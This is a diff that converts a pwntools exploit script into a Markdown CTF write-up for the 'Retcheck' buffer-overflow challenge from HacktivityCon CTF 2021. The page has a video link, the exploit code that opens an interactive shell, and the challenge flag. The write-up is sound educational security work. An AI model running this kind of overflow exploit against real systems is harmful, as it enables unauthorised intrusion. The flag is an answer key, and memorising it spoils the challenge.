@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: Retcheck (2021)
+event: HacktivityCon CTF 2021
+category: Pwn
+description: Writeup for Retcheck (pwn) - HacktivityCon CTF (2021) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Retcheck
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/niPj8jYahV0/0.jpg)](https://youtu.be/niPj8jYahV0?t=910s "HacktivityCon 2021: Retcheck")
+
+## Challenge Description
+
+> Stack canaries are overrated.
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +39,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Find offset to EIP/RIP for buffer overflows
 def find_ip(payload):
@@ -24,13 +53,11 @@ def find_ip(payload):
     info('located EIP/RIP offset at {a}'.format(a=ip_offset))
     return ip_offset
 
-
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
 init-pwndbg
 continue
 '''.format(**locals())
-
 
 # Binary filename
 exe = './retcheck'
@@ -65,3 +92,6 @@ io.sendlineafter('!', payload)
 
 # Got Shell?
 io.interactive()
+```
+
+Flag: `flag{a73dc20c1cd1f918ae7b591e8625e349}`
